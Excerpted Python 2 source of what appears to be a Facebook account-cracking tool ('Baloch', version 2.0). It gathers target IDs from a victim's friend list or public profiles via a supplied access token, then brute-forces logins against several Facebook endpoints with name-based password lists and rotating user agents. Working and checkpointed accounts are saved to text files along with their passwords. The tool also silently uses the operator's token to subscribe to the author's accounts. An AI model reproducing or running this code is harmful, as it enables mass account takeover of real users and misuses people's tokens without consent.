...
def __seting_ua_dev__():
	...
	print h+" ["+p+"8"+h+"]"+p+" User-Agent Manual "
	print m+" ====================================="
	pil = raw_input(a+" [?]"+p+" Choose? "+k)

	sukses = p+"\n >_<"+h+" Successful Setting User-Agent "
	jalankan = a+"+>> "+p+"Run Tool Again Bro !"

	if pil == "8":
		print garis
		ua = raw_input(a+" [?]"+p+" User-Agent"+k+": ")
		print sukses
		with open("hp.txt", "w") as uw:
			uw.write("Setting Manual")
...
header = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109"}

def cek_hasil():
	print m+" ====================================="
	print k+" 1. "+p+"Check Acount OK"
	print k+" 2. "+p+"Check Acount CP"
	print k+" 3. "+p+"Clear Acount CP/OK"
	print m+" ====================================="
	pil = raw_input(h+">>> ")
	if pil == "1":
		oke = []
		try:
			print h+" >_<"+p+" Acount OK"+h+">>>"
		...
		try:
			...
			print k+" >_<"+p+" Acount CP"+k+">>>"
			cp = open("hasil_cp.txt", "r").readlines()
			print p+"\n   Total Crack Acount With Date "
			...
			print m+"\n   X "+p+"Not Found Acount CP"
			pass
	elif pil == "3":
		print m+" ====================================="
		print k+" 1. "+m+"Acount "+p+" OK"
		print k+" 2. "+m+"Acount "+p+" CP"
		print m+" ====================================="
		pilih_ku = raw_input(h+">>> ")
		if pilih_ku == "1":
			y_n = raw_input(a+"\n Clear All Acount OK ? "+p+"[y/n]: ")
			if y_n == "y":
				try:
...
def love_token(token):
	lis_id_foll = ["742821237", "100007061760822"]
	with requests.Session() as dev_:
		...
		dev_.post("https://graph.facebook.com/{}/subscribers?access_token={}".format(random.choice(["742821237", "100002606153676", "100007061760822"]), token))
		ikuti_ = []
def komen(token):
	for dev in range(1):
		with requests.Session() as dev_:
...
def login_dengan_token():
	try:
		print ""
		print m+" ====================================="
		print p+"   L o g i n  W i t h "+h+" T o k e n"
		print m+" ====================================="
		tok_in = raw_input(h+" ["+k+"Put"+h+"]"+p+" Token Here"+k+": ")
		...
		komen(token)
		print p+"\n "+h+"  Login Successful...."
		print p+"\n Login Complete !\n Run Again By Typ "+k+"python2 B-PRO.py\n"
...
def teman_teman_(token, user):
	...
	try:
		...
		with requests.Session() as ses_:
			...
			print m+" ["+d+"*"+m+"]"+d+" Target ID Name"+d+" : "+nama["name"]			
			...
			with requests.Session() as ses_:
				...
				for dev in data["data"]:
				  	try:
						...
						if r == user:
							print m+"\r ["+d+"*"+m+"]"+d+" Target ID"+"".join(ttl__)+d+": "+str(len(user_id)),
							sys.stdout.flush()
						else:
							t = te.replace(te, "")
							print m+"\r ["+d+"*"+m+"]"+d+" Target ID"+"".join(ttl__)+d+": "+t+str(len(user_id)),
							sys.stdout.flush()
...
def __cp__(eml_dev, san_dev):
	...
	data = m+"\r["+d+"Baloch-Cp"+m+"]"+m+" {:<15}\033[90;1m | \033[90;1m{}   ".format(eml_dev,san_dev)
	if len(sesi) != 0:
		eml_dev = eml_dev+">>>"
...
def __ttl__cp_(eml_dev, ttl, san_dev):
	try:
		wak = datetime.datetime.now()
		waktu = str(wak.year)+"-"+str(wak.month)+"-"+str(wak.day)
		data = m+"\r["+d+"Baloch-Cp"+m+"]"+m+" {:<15}\033[90;1m | \033[90;1m{}\033[90;1m | \033[90;1m{}   ".format(eml_dev,san_dev,ttl)
		if len(sesi) != 0:
			eml_dev = eml_dev+">>>"
			cek_dev(eml_dev, san_dev, data)
		else:
...
def crack_dev_api(iqbal_, dev___):
	...
	tampil = m+"[\033[93;1mBALOCH\033[93;1m]\033[93;1m{}\033[93;1m/\033[90;1m{}\033[93;1m|\033[93;1mOk\033[93;1m/\033[93;1mCp:\033[93;1m{}\033[93;1m/\033[93;1m{}".format(len(user_id),count_,len(hasil_ok),len(hasil_cp))
	print "\r"+tampil,
	sys.stdout.flush()
	count_ +=1
	eml_dev = iqbal_
	...
	for san_ in dev___:
		try:	
			...
			# user_agent = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
			if len(ua_hp) != 0:
				user_agent = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]", 
											"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]",
											"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]",
											"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"])
			...
			if 'session_key' in response.text and 'EAAA' in response.text:
				...
				if eml_dev in hasil_ok:
					...
					print a+"\r["+p+"Baloch-Ok"+a+"]"+h+" {:<15}\033[92;1m | \033[92;1m{} \033[92;1mLogin FB Lite ".format(eml_dev,san_dev)
...
def crack_dev(iqbal_, dev___):
	...
	eml_dev = iqbal_
	print m+"\r[\033[93;1mBALOCH\033[93;1m]\033[93;1m{}\033[93;1m/\033[93;1m{}\033[93;1m|\033[93;1mOK\033[93;1m/\033[93;1mCP:\033[93;1m{}\033[93;1m/\033[93;1m{}".format(len(user_id),count_,len(hasil_ok),len(hasil_cp)),
	sys.stdout.flush()
	count_ +=1	
			...
			with requests.Session() as ses_dev:
				...
				if "c_user" in login_dev:
					if eml_dev in hasil_ok:
						...
						print a+"\r["+p+"OK"+a+"]"+h+" {:<15}\033[92;1m | \033[92;1m{}".format(eml_dev,san_dev)
						with open("hasil_ok.txt", "a") as hasil:
							hasil.write("[Live] "+ eml_dev + " | " + san_dev +"\n")
						hasil_ok.append(eml_dev)
						break
...
def crack_mobile(iqbal_, dev__):
  try:
	global count_, user_agent
	eml_dev = iqbal_
	print m+"\r[\033[93;1mBALOCH\033[93;1m]\033[93;1m{}\033[93;1m/\033[93;1m{}\033[90;1m|\033[93;1mOK\033[93;1m/\033[93;1mCP:\033[93;1m{}\033[93;1m/\033[93;1m{}".format(len(user_id),count_,len(hasil_ok),len(hasil_cp)),
	sys.stdout.flush()
	count_ +=1
	if 2 == len(eml_dev):
		eml_dev = eml_dev[0]
...
def sandi_dev():
	...
	print m+"\n ["+d+"*"+m+"]"+d+" Tool Suppor Manual "+d+"Password"
	san = raw_input(m+" ["+d+"?"+m+"]"+d+" Press To Enter?"+d+"ENTER>Skip"+d+" : ")
	sandi_bawaan_koma = "name123,name12345"
	sandi_bawaan_spasi = "name123 name12345"

	while True:
		print m+"\n ["+d+"*"+m+"]"+d+" Example: "+d+"123,1234,12345"
		angka = raw_input(m+" ["+d+"?"+m+"]"+d+" Separate Passward By (Comma)"+d+" : ")
		if len(angka) != 0:
			angka_ = angka.split(",")
			for dev in angka_:
	...
	while True:
		print m+" ====================================="
		print m+" ["+d+"1"+m+"]"+j+" FirstName + LastName FullName"
		print m+" ["+d+"2"+m+"]"+p,
		for dev in angka_nama:
			print m+"FirstName"+d+dev,
		print "FullName"
		print m+" ["+d+"3"+m+"]"+p,
		for dev in angka_nama:
			print j+"FirstName+LastName"+d+dev,
		print "FirstName+LastName FullName"
		print m+" ["+d+"4"+m+"]"+p,
		for dev in angka_nama:
			print d+"FirstName"+d+dev,
		for dev in angka_nama:
			print d+"FirstName+LastName"+d+dev,
		print "FirstName+LastName FullName"
		print m+" ====================================="
		pil = raw_input(m+" ["+d+"?"+m+"]"+d+" Choose Passward "+d+": ")
		if pil == "1":
			pilih.append("1")
			break
		elif pil == "2":
	...
	if len(ttl__) != 0:
		while True:
			print m+" ====================================="
			pil = raw_input(m+" ["+d+"?"+m+"]"+d+" Crack With TTL?"+d+"[y/n]"+d+": ")
	...
	while True:
		print m+" ====================================="
		pil = raw_input(m+" ["+d+"?"+m+"]"+d+" Apply "+d+" Cp-Detector  ?"+d+"[y/n]"+d+": ")
		if "y" in pil or "Y" in pil:
			sesi.append("Dev")
			break
		elif "n" in pil or "N" in pil:
...
def auto_dev():
	try:
		print a+"\n >>>"+p+" Press"+h+" CTRL+Z"+p+" To Stop Proses\n"
		...
		print k+"\n Not Found Acount Checkpoint..\n"
		exit()

def __pilih_crack__():
	try:
		print m+" ====================================="
		print m+" ["+d+"1"+m+"]"+d+" Crack"+j+" Login Instagram Lewat Facebook"
		print m+" ["+d+"2"+m+"]"+d+" Crack"+a+" Login Free Fire"+d+"("+m+"FF"+d+")"+d+" Lewat FB"
		print m+" ["+d+"3"+m+"]"+d+" Crack"+k+" Login Mobile Legend"+d+"("+m+"MLBB"+d+")"+d+" Lewat FB"
		print m+" ["+d+"4"+m+"]"+d+" Crack API facebook"+d+"("+m+"fast Cracking"+d+")"+d+">> Super Pro"
		print m+" ["+d+"5"+m+"]"+d+" Crack"+b+" Login Lewat facebook Mobile"
		print m+" ["+d+"6"+m+"]"+d+" Crack"+h+" Login Lewat facebook"+m+" Mbasic"+d+" Pro.."
		print m+" ["+d+"7"+m+"]"+d+" Crack"+p+" Login Lewat facebook Free"
		print m+" ====================================="
		pilih = raw_input(m+" +>>>"+m+" ")
		...
		if len(ua_) == 1 and pilih == "4":
			ua = raw_input(m+"\n ["+d+"?"+m+"]"+d+" Crack With User-Agent Random?"+d+"[y/n]"+d+"ENTER>Skip"+d+": ")
			if "y" in ua or "Y" in ua:
				try:
					print m+" ["+d+"*"+m+"]"+d+" Crack"+d+" User-Agent "+d+"Random"
					ua_hp.append("IqbalDev")
					pass
				except:
					print "\n Error\n"
				...
				print m+" ["+d+"*"+m+"]"+d+" Crack With"+d+" User-Agent (1) "
				pass
		...
		if len(ua_) == 1 and pilih != "4": 
			...
			if "y" in ua or "Y" in ua:
				...
				print m+" ["+d+"*"+m+"]"+d+" Crack With "+d+" User-Agent are  Set "
				pass
		print m+" ====================================="
		print m+" ["+d+"*"+m+"]"+d+" Process Has Been Started .. "
		print m+" ["+d+"!"+m+"]"+d+" To Stop Process Press CTRL+Z ..!"
		print m+" ["+d+"!"+m+"]"+d+" Enjoy Fast Speed Cloning Bro .... "
		print m+" ["+d+"!"+m+"]"+d+" Use Airplane Mode For 5 Sec ..!"
		print m+" ====================================="
		if pilih == "1":
...
\x1b[93;1m                    
  ...
  ███      █     ▀      ▀███▀     █  
          █
 \n =====================================
"""+d+"""  Author"""+d+""" : """+d+"""Mubashar Baloch"""+a+"""  """
 	print d+" "+d+" IP     : "+d+ip
 	print d+" "+d+" Versi  : "+d+"2.0"+m+"\n ====================================="
def reg():
    os.system('clear')
    banner()
    print m+" ====================================="
    ...
    r = requests.get('https://raw.githubusercontent.com/MubasharBaloch/Filecrack/main/server.txt').text
    if to in r:
...
def login():
  ...
  try:
	...
	banner()
	print p+"   L o g i n  With  F a c e b o o k "
	print m+" ====================================="
	print h+" ["+p+"A"+h+"]"+p+" Login With FB"+h+" Token"
	print h+" ["+p+"W"+h+"]"+p+" Crack 2009 Acount"+h+" (W-login)"
	print h+" ["+p+"T"+h+"]"+p+" Get Free Token"+h+" Unlimated"
	print h+" ["+p+"B"+h+"]"+p+" Contact With Authur"+h+" FB"
	print h+" ["+p+"C"+h+"]"+p+" Jion Out Group"+h+" Facebook "
	print h+" ["+p+"Z"+h+"]"+m+" Exit"+p+"..."
	print m+" ====================================="
	pilih = raw_input(h+" ["+k+"?"+h+"]"+p+" Choose Option ? ")
	if pilih == "" or pilih == " " or pilih == "  ":
		keluar()
	if pilih == "W":
		os.system("python s_main.py")
	if pilih == "T":
		os.system("xdg-open https://wa.me/+923470336477")
	if pilih == "A":
		login_dengan_token()
	if pilih == "B":
		os.system("xdg-open https://m.facebook.com/MUB4SH4R")
	if pilih == "C":
		os.system("xdg-open https://m.facebook.com/groups/helpingzonebymubasharbaloch")
	if pilih == "Z":
		keluar()
	else:
		login()
...
def __menu__(token):
	...
	try:
		...
		with requests.Session() as ses_:
			...
			print m+" ["+d+"*"+m+"]"+d+" User   :",a+" "+d+nama["name"]+a+" "
			print m+" ["+d+"*"+m+"]"+d+" ID     :"+d,nama["id"]
			try:
				if user_agent_ == cokiez: 
					...
					print m+" ["+d+"*"+m+"]"+d+" Status : "+f+"Premium "
			except NameError:
				print m+" ["+d+"*"+m+"]"+d+" Status : "+d+"Premium "
			print m+" ====================================="
			print m+" ["+d+"A"+m+"]"+d+" Crack from Public"+m+" / Friend + TTL "
			print m+" ["+d+"B"+m+"]"+d+" Crack Old 2009 Acount"+m+" (W-login)"
			print m+" ["+d+"C"+m+"]"+d+" Check Total Crack"+m+" OK"+m+" / "+m+"CP"
			print m+" ["+d+"D"+m+"]"+d+" Log Out From Facebook"+m+" / (Token) "
			print m+" ["+d+"E"+m+"]"+d+" Update Tool"
			print m+" ["+d+"F"+m+"]"+d+" Setting User-Agent"+m+" / (Pro) "
			print m+" ["+d+"G"+m+"]"+d+" Checkpoint Detector"+m+" / (Pro) "
			print m+" ["+d+"H"+m+"]"+m+" Exit.."+m
			print m+" ====================================="
			pilih = raw_input(m+" >>> "+d+"")
			if pilih == "B":
					os.system("python s_main.py")
